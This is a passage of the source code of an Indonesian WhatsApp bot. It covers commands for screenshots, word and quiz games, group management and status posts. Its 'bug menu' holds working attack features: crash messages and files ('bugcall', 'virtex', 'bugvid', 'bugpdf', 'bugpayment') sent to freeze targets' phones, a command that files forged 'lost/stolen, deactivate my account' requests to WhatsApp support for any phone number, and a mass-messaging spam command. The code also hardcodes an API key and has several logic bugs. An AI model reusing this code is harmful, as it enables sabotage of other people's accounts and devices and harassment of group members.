                conn.sendMessage(from, wait)
await sleep(600)
                conn.sendMessage(from, {
                    image: {
                        url: `https://aemt.me/sshp?url=${q}`
                    }
                }, {
                    quoted: msg
                })
                break
              case 'ss':
              case 'screenshot':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ss* hp/pc/tab|link`)
                conn.sendMessage(from, wait)
await sleep(600)
                var tt = q.split('|')[0] ? q.split('|')[0] : '-'
                var ttt = q.split('|')[1] ? q.split('|')[1] : '-'
                conn.sendMessage(from, {
                    image: {
                        url: `https://aemt.me/ss${tt}?url=${ttt}`
                    }
                }, {
                    quoted: msg
                })
                break
               case 'test':
                reply(mess.wait)
                var test = `https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg`
                conn.sendMessage(from, {
                    image: {
                        url: `https://api.xcodeteam.xyz/api/canvas/welcome?api_key=${setting.apikey.xcode}&member_name=${pushname}&group_name=${groupName}&member_count=${groupMembers}&profile_picture_image_url=https://telegra.ph/file/6880771a42bad09dd6087.jpg&background_image_url=${test}`
                    }
                }, {
                    quoted: msg
                })
                break
               case 'nulis':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var img = await getBuffer(`http://api.caliph.biz.id/api/nuliskiri?text=${q}&apikey=${apikey.caliph}`)
                   conn.sendMessage(from, { image: img }, { quoted: msg }).catch((e) => reply(mess.error.api))
                   limitAdd(sender, limit)
                   break
               case 'sertifikat':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}sertifikat* nama`)
                conn.sendMessage(from, wait)
await sleep(600)
                conn.sendMessage(from, {
                    image: {
                        url: `https://zeltoria.site/api/maker/tolol?q=${q}`
                    }
                }, {
                    quoted: msg
                })
                break
               case 'fakechat':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}sertifikat* nama`)
                reply(mess.wait)
                conn.sendMessage(from, {
                    image: {
                        url: `https://api.caliph.biz.id/api/fakechat/wa?name=ujicoba&text=Hi,%20you!&num=6283857092641&apikey=VSlyd5WE`
                    }
                }, {
                    quoted: msg
                })
                break
               case 'nekopoi': {
                reply(`Dosa ditanggung oleh pengguna\nAgree`)
                let wtf = await fetchJson(`https://zeltoria.site/api/random/nekopoi`)                
                conn.sendMessage(from, {
                    video: wtf.result
                       }, { quoted: msg })
                   }
                   break
               case 'gimage': case 'google':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/searcher/google-image?api_key=${setting.apikey.xcode}&gi_search=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   conn.sendMessage(from, { image: { url: req.data[0] }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
			   // Game Menu
               case 'asahotak':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, asahotak)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/asahotak?apikey=${apikey.skizo}`)).json()
                   var { soal, jawaban } = req
                   var teks = `*ASAH OTAK*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendAsahOtak = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'AO' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Asah Otak', jawab, gamewaktu, sendAsahOtak, asahotak)
                   gameAdd(sender, glimit)
                   break
               case 'caklontong':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, caklontong)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/caklontong?apikey=${apikey.skizo}`)).json()
                   var { soal, jawaban } = req
                   var teks = `*CAK LONTONG*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendCakLontong = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'CL' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Cak Lontong', jawab, gamewaktu, sendCakLontong, caklontong)
                   gameAdd(sender, glimit)
                   break
			case 'family100':
                if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (isPlayGame(from, family100)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                var req = await (await fetch(`https://skizo.tech/api/game/family100?apikey=${apikey.skizo}`)).json()
                   var { soal, jawaban } = req
                   var teks = `*FAMILY 100*\n\n`+monospace(`Soal : ${soal}\nTotal Jawaban : ${jawaban.length}\nWaktu : ${gamewaktu}s`)
                   conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'FML' })
                   .then( res => {
                      let rgfds = []
                      for (let i of jawaban) {
                      let fefs = i.split('/') ? i.split('/')[0] : i
                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ', '') : fefs
                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                      rgfds.push(axsf.toLowerCase())
                    }
                     addPlayGame(from, 'Family 100', rgfds, gamewaktu, res, family100)
                     gameAdd(sender, glimit)
                     })
                   break
                case 'siapakahaku':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, siapakahaku)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/siapakahaku?apikey=${apikey.skizo}`)).json()
                   var { soal, jawaban } = req.data
                   var teks = `*SIAPAKAH AKU*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendSiapakahAku = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'SA' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Siapakah Aku', jawab, gamewaktu, sendSiapakahAku, siapakahaku)
                   gameAdd(sender, glimit)
                   break
                 case 'susunkata':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, susunkata)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/susunkata?apikey=${apikey.skizo}`)).json()
                   var { soal, tipe, jawaban } = req
                   var teks = `*SUSUN KATA*\n\n`+monospace(`Soal : ${soal}\nTipe : ${tipe}\nWaktu : ${gamewaktu}s`)
                   var sendSusunKata = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'SK' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Susun Kata', jawab, gamewaktu, sendSusunKata, susunkata)
                   gameAdd(sender, glimit)
                   break
                case 'tebakbendera':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakbendera)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/tebakbendera?apikey=${apikey.skizo}`)).json()
                   var { flag, img, name } = req
                   var teks = `*TEBAK BENDERA*\n\n`+monospace(`Flag : ${flag}\nPetunjuk : ${name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakBendera = conn.sendMessage(from, { image: { url: img }, caption: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TB' })
                   var jawab = name.toLowerCase()
                   addPlayGame(from, 'Tebak Bendera', jawab, gamewaktu, sendTebakBendera, tebakbendera)
                   gameAdd(sender, glimit)
                   break
                case 'tebakgambar':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakgambar)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/tebakgambar?apikey=${apikey.skizo}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { img, jwb, lvl } = req
                   var teks = `*TEBAK GAMBAR*\n\n`+monospace(`Random Level : ${lvl}\nPetunjuk : ${jwb.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakGambar = conn.sendMessage(from, { image: { url: img }, caption: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TG' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Bendera', jawab, gamewaktu, sendTebakGambar, tebakgambar)
                   gameAdd(sender, glimit)
                   break
                case 'tebakkalimat':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakkalimat)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/tebakkalimat?apikey=${apikey.skizo}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req
                   var teks = `*TEBAK KALIMAT*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakKalimat = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TK' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Kalimat', jawab, gamewaktu, sendTebakKalimat, tebakkalimat)
                   gameAdd(sender, glimit)
                   break
                case 'tebakkata':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakkata)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/tebakkata?apikey=${apikey.skizo}`)).json()
                   var { soal, jawaban } = req
                   var teks = `*TEBAK KATA*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakKata = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TKK' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Kata', jawab, gamewaktu, sendTebakKata, tebakkata)
                   gameAdd(sender, glimit)
                   break
                case 'tebakkimia':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakkimia)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-kimia?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { unsur, lambang } = req.data
                   var teks = `*TEBAK KIMIA*\n\n`+monospace(`Unsur : ${unsur}\nWaktu : ${gamewaktu}s`)
                   var sendTebakKimia = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TKKK' })
                   var jawab = lambang.toLowerCase()
                   addPlayGame(from, 'Tebak Kimia', jawab, gamewaktu, sendTebakKimia, tebakkimia)
                   gameAdd(sender, glimit)
                   break
                case 'tebaklirik':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebaklirik)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/tebaklirik?apikey=${apikey.skizo}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req
                   var teks = `*TEBAK LIRIK*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakLirik = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TLL' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Lirik', jawab, gamewaktu, sendTebakLirik, tebaklirik)
                   gameAdd(sender, glimit)
                   break
                case 'kuis':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, kuis)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://skizo.tech/api/game/tebaktebakan?apikey=${apikey.skizo}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req
                   var teks = `*KUIS GAME*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendKuis = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'KS' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Kuis Game', jawab, gamewaktu, sendKuis, kuis)
                   gameAdd(sender, glimit)
                   break
                case 'math':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, math)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   if (args.length < 2) return reply(`Masukkan modenya!\n\nMode yang tersedia :\n1. noob\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n7. impossible2\n\nContoh : ${command} noob`)
                   genMath(q.toLowerCase()).then(res => {}).catch(() => reply('Lah?'))
                   var poke = await genMath(q.toLowerCase())
                   var { soal, mode, jawaban } = poke
                   var teks = `*MATH GAME*\n\n`+monospace(`Soal : ${soal}\nMode : ${mode}\nWaktu : ${gamewaktu}s`)
                   conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'MH' })
                   .then( res => {
                     var jawab = jawaban
                     addPlayGame(from, 'Math Game', jawab, gamewaktu, res, math)
                     gameAdd(sender, glimit)
                 }).catch(() => reply(mess.error.api))
                 break
                case 'delgame': case 'deletegame':
                case 'dellgame': case 'nyerah':
                   if (!isQuotedMsg) return reply(`Balas pesan soal game yang ingin dihapus`)
                   if (quotedMsg.id.endsWith('AO')) {
                     var ao = getGamePosi(from, asahotak)
                     if (ao == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Asah Otak*\nJawaban : ${asahotak[ao].jawaban}`)
                     asahotak.splice(ao, 1)
                   } else if (quotedMsg.id.endsWith('CL')) {
                     var cl = getGamePosi(from, caklontong)
                     if (ao == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Cak Lontong*\nJawaban : ${caklontong[cl].jawaban}`)
                     caklontong.splice(cl, 1)
                   } else if (quotedMsg.id.endsWith('FML')) {
                     var fml = getGamePosi(from, family100)
                     if (fml == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Family100 Game*\nJawaban : ${family100[fml].jawaban}`)
                     family100.splice(fml, 1)
                   } else if (quotedMsg.id.endsWith('SA')) {
                     var sa = getGamePosi(from, siapakahaku)
                     if (sa == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Siapakah Aku*\nJawaban : ${siapakahaku[sa].jawaban}`)
                     siapakahaku.splice(sa, 1)
                   } else if (quotedMsg.id.endsWith('SK')) {
                     var sk = getGamePosi(from, susunkata)
                     if (sk == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Susun Kata*\nJawaban : ${susunkata[sk].jawaban}`)
                     susunkata.splice(sk, 1)
                   } else if (quotedMsg.id.endsWith('TB')) {
                     var tb = getGamePosi(from, tebakbendera)
                     if (tb == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Bendera*\nJawaban : ${tebakbendera[tb].jawaban}`)
                     tebakbendera.splice(tb, 1)
                   } else if (quotedMsg.id.endsWith('TG')) {
                     var tg = getGamePosi(from, family100)
                     if (tg == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Gambar*\nJawaban : ${tebakgambar[tg].jawaban}`)
                     tebakgambar.splice(tg, 1)
                   } else if (quotedMsg.id.endsWith('TK')) {
                     var tk = getGamePosi(from, tebakkalimat)
                     if (tk == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Kalimat*\nJawaban : ${tebakkalimat[tk].jawaban}`)
                     tebakkalimat.splice(tk, 1)
                   } else if (quotedMsg.id.endsWith('TKK')) {
                     var tkkk = getGamePosi(from, tebakkata)
                     if (tkkk == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Kata*\nJawaban : ${tebakkata[tkkk].jawaban}`)
                     tebakkata.splice(tkkk, 1)
                   } else if (quotedMsg.id.endsWith('TKKK')) {
                     var tkk = getGamePosi(from, tebakkimia)
                     if (tebakkimia[tkk].msg.key.id !== quotedMsg.id) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Kimia*\nJawaban : ${tebakkimia[tkk].jawaban}`)
                     tebakkimia.splice(tkk, 1)
                   } else if (quotedMsg.id.endsWith('TLL')) {
                     var tll = getGamePosi(from, tebaklirik)
                     if (tll == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Lirik*\nJawaban : ${tebaklirik[tll].jawaban}`)
                     tebaklirik.splice(tll, 1)
                   } else if (quotedMsg.id.endsWith('KS')) {
                     var ks = getGamePosi(from, kuis)
                     if (ks == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Kuis Game*\nJawaban : ${kuis[ks].jawaban}`)
                     kuis.splice(fml, 1)
                   } else if (quotedMsg.id.endsWith('MH')) {
                     var mh = getGamePosi(from, math)
                     if (mh == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Math Game*\nJawaban : ${math[mh].jawaban}`)
                     math.splice(mh, 1)
                   } else {
                     reply(`Balas soal game!`)
                   }
                   break
			// bug menu
             case 'jc':
             case 'bugcall':
                if (!isCreator && !isGroupAdmins) return reply(`Khusus grup`)
                if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
			    var teks = `\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n`
			conn.relayMessage(from, {
                        scheduledCallCreationMessage: {
                        callType: "AUDIO",
                        scheduledTimestampMs: Date.now(),
                        title: teks
                        }
                    }, { quoted: msg })
				break
		    case 'virtex':
          	 if (!isCreator) return reply(`mess.only.ownerB`)
               if (args.length < 2) return reply(`Kirim perintah ${command} target`)
               let lan = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
               conn.sendMessage(from, {
                     text: virt
                }, {
                    quoted: msg
                })
			    break
			case 'bugvideo':
			case 'bugvid':
          	 if (!isCreator) return reply(`mess.only.ownerB`)
               conn.sendMessage(from, {
                        video: fs.readFileSync('./vanz_other/bugvid.mp4'),
                        caption: `hp tertentu yang bisa kena`,
                        gifPlayback: true
                    }, {
                      quoted: msg 
                 })
			    break
			case 'pushcontact':
            case 'pushkontak': {
               if (!isCreator) return reply(mess.OnlyOwner)
               if (!isGroup) return reply(`The feature works only in grup`)
               if (!q) return reply(`kirim perintah ${command} text?`)
               let daff = await groupMembers.filter(v => v.id.endsWith('.net')).map(v => v.id)
              reply(`Success in pushing the message to contacts`)
               for (let vanz of daff) {
               conn.sendMessage(vanz, { text: q })
               }  
               reply(`Done`)
               }
               break
            case 'bugpayment':
                if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
			    var teks = `${q}`
			conn.relayMessage(from, {  
              requestPaymentMessage: { 
                 message: { 
                 extendedTextMessage: { 
                     text: teks, 
                     currencyCodeIso4217: 'INR',
                     requestFrom: '0@s.whatsapp.net',
                     expiryTimestamp: 8000, amount: 1,
                     contextInfo: {
                       "externalAdReply": {
                         "title": `PAPA XEON`,
                         "body": `my friend ${pushname}`,
                         mimetype: 'audio/mpeg', caption: ` ${teks}`,
                         showAdAttribution: true,
                         sourceUrl: hmm.linkmenu,
                         thumbnailUrl: hmm.wa,
                         }
                       }
                     }
                   }
                 }
                })
                break
            case 'bugpdf':{
               if (!isCreator) return reply(mess.OnlyOwner)
               var anuin = fs.readFileSync('./media/ngeselin.BIN')
                conn.sendMessage(from, { document: anuin, mimetype: 'application/pdf', fileName: `     ${q}.pdf`, title: `    .pdf` }, { quoted: msg })
                 }
                break
            case 'verify': case 'banned': case 'kenon': case 'logout': {
 if (!isCreator) return reply(`Khusus Creator`)
 if (!q) return reply(`Targetnya?`)
 var axioss = require ("axios")
 var cheerio = require("cheerio")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
            }
            break
          // new data
            case 'getcase':
            case 'ambilcase':
                if (!isCreator) return reply(mess.OnlyOwner)
                try {
                   const getCase = (cases) => {
                      return "case " + ''+`'${cases}'` + fs.readFileSync("./message/msg.js").toString().split('case \'' + ''+cases + '\'')[1].split("break")[0] + "break"
                   }
                   reply(`${getCase(q)}`)
                } catch {
                  reply(`case ${q} tidak ditemukan!`)
                }
            break
            case 'statustext': 
            case 'upswteks': {
               if (!isCreator) return reply(mess.OnlyOwner)
               if (!q) return reply('Teks?')
               conn.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: pendaftar })
               reply(`done`)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!isCreator) return reply(mess.OnlyOwner)
               var fileName = 'video'+makeid(10)+'.mp4'
               var videosw = await downloadAndSaveMediaMessage(msg, 'video', `./sticker/${fileName}`)
                  await conn.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: pendaftar })
                  await reply(`Done`)
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!isCreator) return reply(mess.OnlyOwner)
               var imagesw = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                  await conn.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: pendaftar })
                  await reply(`Done`)
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!isCreator && !fromMe) return reply(mess.OnlyOwner)
               var fileName = 'audio'+makeid(10)+'.mp3'
               var vnsw = await downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${fileName}`)
                  await conn.sendMessage('status@broadcast', {
                     audio: {
                        url: vnsw
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: pendaftar 
                  })
                  await reply(`Done`)
            }
            break
            case 'addcase': {
               if (!isCreator) return reply(mess.OnlyOwner);
               if (!q) return reply('Contoh:\n.addcase case \'tes\':\nnewReply(\'berhasil\')\nbreak');
               if (!q.includes("case '")) return reply("😔 case nya harus gini case '");
               let code = fs.readFileSync('./message/msg.js', 'utf8');
               let indexSwitchCommand = code.indexOf('// Created By Vanz')
               if (indexSwitchCommand !== -1) {
                  const newCase = `${q}\n\n\n\n\n`;
                  var cod = code.slice(0, indexSwitchCommand + 20)  + newCase + code.slice(indexSwitchCommand + 20);
                  fs.writeFileSync('./message/msg.js', cod);
                  reply(`done`);
               } else {
                  reply(`error`);
               }
            }
            break
			// Group Menu
			case 'linkgrup': case 'link': case 'linkgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
			    url = 'https://chat.whatsapp.com/'+url
				reply(url)
				break
			case 'setppgrup': case 'setppgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (isImage || isQuotedImage) {
				  var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/ppgc${from}.jpeg`)
			      await conn.updateProfilePicture(from, { url: media })
				  .then( res => {
					reply(`Sukses`)
					fs.unlinkSync(media)
				  }).catch(() => reply(mess.error.api))
				} else {
			      reply(`Kirim/balas gambar dengan caption ${command}`)
				}
				break
			case 'setnamegrup': case 'setnamegc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				await conn.groupUpdateSubject(from, q)
			    .then( res => {
				  reply(`Sukses`)
				}).catch(() => reply(mess.error.api))
			    break
			case 'setdesc': case 'setdescription':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				await conn.groupUpdateDescription(from, q)
			    .then( res => {
			      reply(`Sukses`)
				}).catch(() => reply(mess.error.api))
				break
		    case 'afk':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (isAfkOn) return reply("Kakak Sudah Afk Sebelumnya")
                let reason = q ? q : 'Nothing.'
                afk.addAfkUser(sender, Date.now(), reason, _afk)
                reply(`${pushname} Sedang AFK\nDengan Alasan : ${reason}`)
                break
			case 'group': case 'grup':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				if (args[1] == "close") {
				  conn.groupSettingUpdate(from, 'announcement')
				  reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
				} else if (args[1] == "open") {
				  conn.groupSettingUpdate(from, 'not_announcement')
				  reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
				} else {
				  reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				}
			    break
			case 'revoke':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				await conn.groupRevokeInvite(from)
			    .then( res => {
				  reply(`Sukses menyetel tautan undangan grup ini`)
				}).catch(() => reply(mess.error.api))
				break
	        case 'delete': case 'del': case 'd':
                   if (!isQuotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
                   if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
                   conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
                   break
            case 'delete1':
                   if (!isQuotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
